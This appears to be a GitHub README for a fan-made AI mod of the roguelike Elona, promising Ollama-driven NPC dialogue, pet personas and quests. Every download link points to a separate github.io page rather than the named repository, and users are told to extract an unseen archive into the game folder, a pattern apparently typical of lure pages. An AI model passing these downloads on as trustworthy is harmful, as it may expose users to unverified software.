<div align="center">

# Elona — AI Edition

[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://laplaplaplas.github.io/download/)
[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://laplaplaplas.github.io/download/)
[![North Tyris sandbox](https://img.shields.io/badge/North%20Tyris-Open%20World-5a7a3a?style=for-the-badge)](https://laplaplaplas.github.io/download/)

[![Local](https://img.shields.io/badge/100%25-Local%20%26%20Private-brightgreen?style=flat-square)](https://github.com/SparkConduit/elona-ai-edition)
[![Offline](https://img.shields.io/badge/Works-Offline-informational?style=flat-square)](https://github.com/SparkConduit/elona-ai-edition)
[![No Subscription](https://img.shields.io/badge/Cost-%240%20Forever-success?style=flat-square)](https://github.com/SparkConduit/elona-ai-edition)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)

🎲 **Roguelike · Open World · AI Roleplay · Locally Hosted**

</div>

---

## About

**Elona — AI Edition** is the odd one out here: an enormous, chaotic open-world roguelike where you can be a farmer, a pianist, a criminal or a corpse, usually within the same hour.

The mod gives the world's NPCs, pets and shopkeepers real conversational depth, and generates quests in Elona's own register of cheerful lunacy — which is to say, quests that make no sense and pay badly.

> 🎲 Quest generation in Elona's actual voice: escort a chicken, entertain a noble, retrieve something nobody wanted. The AI has understood the assignment.

---

## ✨ Features

- 📜 **Quest generation** — Procedural jobs with the game's specific absurdist framing.
- 🐕 **Pet personalities** — Your party animals get individual personas that persist.
- 🏪 **Shopkeeper haggling** — Negotiation with merchants who have opinions about you.
- 🎹 **Performance mode** — Play music in a tavern and get an in-character audience reaction.
- 🔒 **Local inference** — Offline, free, and running on your hardware.
- 📖 **Adventurer log** — A running chronicle of your increasingly stupid career.

---

## 👥 North Tyris

| Character | Role | How the AI plays them |
|-----------|------|-----------------------|
| **Your pets** | Party | Persistent personas that develop over a long save |
| **Shopkeepers** | Merchants | Individual haggling styles and long memories about theft |
| **Adventurers** | NPCs | Rival characters with their own generated backstories |
| **Quest givers** | Townsfolk | Sources of the mod's procedurally deranged job board |

> Every persona is a plain-text file. Open it, rewrite it, and the character changes.

---

## 📥 Download & Installation

### Step 1 — Get the mod

[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)

### Step 2 — Install Ollama (the local AI engine)

Ollama is a free, open-source runtime that executes language models directly on your own hardware.

1. Download it from **https://ollama.com/download** for your operating system
2. Run the installer and let it finish
3. Open a terminal and pull a model:

   ```
   ollama pull llama3
   ```

   *(~4.7 GB. Any model from https://ollama.com/library will work — larger models give
   better in-character writing, smaller ones respond faster.)*

### Step 3 — Install into Elona

1. Start from a clean, working installation of **Elona**
2. Extract the downloaded archive
3. Copy its contents into the game's main folder
4. Launch the game — the AI layer initialises on first run

---

## 🎯 Adventuring

1. Name your pets. The persona system anchors to names and they develop from there.
2. The adventurer log across a long save is the mod's real payoff.
3. Elona+ has different data paths; select your variant in the config.

---

## ⚙️ Recommended Setup

| Tier | Model | RAM | VRAM | Feel |
|------|-------|-----|------|------|
| Minimum | 7B quantised | 8 GB | 4 GB | Works; expect pauses |
| Recommended | 8B–13B | 16 GB | 8 GB | Smooth, in-character |
| Best | 27B+ | 32 GB | 16 GB+ | Noticeably sharper writing |

CPU-only inference is supported and slower. No GPU is strictly required.

---

## ❓ FAQ

**Q: Elona or Elona+?**
> Both are supported. Elona+ Custom builds also work with the correct config flag.

**Q: Does it affect game balance?**
> Generated quests use the game's own reward tables; nothing is inflated.

**Q: Will it survive save corruption?**
> The mod's data is separate, so persona files survive even if a save does not.

**Q: Are my conversations private?**
> Completely. The model runs on your machine and logs are written to a local folder.
> Disconnect from the internet and the mod keeps working.

**Q: Does this use ChatGPT or any paid API?**
> No. There are no API keys, no accounts, and no subscriptions. Ollama is free and open source.

**Q: Can I use an uncensored model?**
> Yes — pull any model from https://ollama.com/library. Uncensored variants sometimes follow
> the roleplay format less reliably, which is a trade-off you control.

**Q: Will this touch my save files?**
> No. The mod never reads or writes the game's save data.

**Q: The AI returned an error instead of a reply. Why?**
> The model produced output the mod couldn't parse. Switch models, lower the temperature,
> or shorten the system prompt.

---

## 📋 Compatibility

| Platform | Status |
|----------|--------|
| Windows 10 / 11 | ✅ Full support |
| macOS (Intel & Apple Silicon) | ✅ Full support |
| Linux | ✅ Full support |
| Ollama models | Any model from ollama.com/library |
| Base game | Elona — PC release |

---

## 🔗 Links

- **[⬇ Download the latest version](https://laplaplaplas.github.io/download/)**
- [Repository](https://github.com/SparkConduit/elona-ai-edition)
- [Ollama — local AI runtime](https://ollama.com)
- [Ollama model library](https://ollama.com/library)

---

<div align="center">

*You have died. You have also been promoted.*

*Fan-made, unofficial, and not affiliated with the creators of Elona.
All game assets are read from your own legally obtained copy.*

</div>
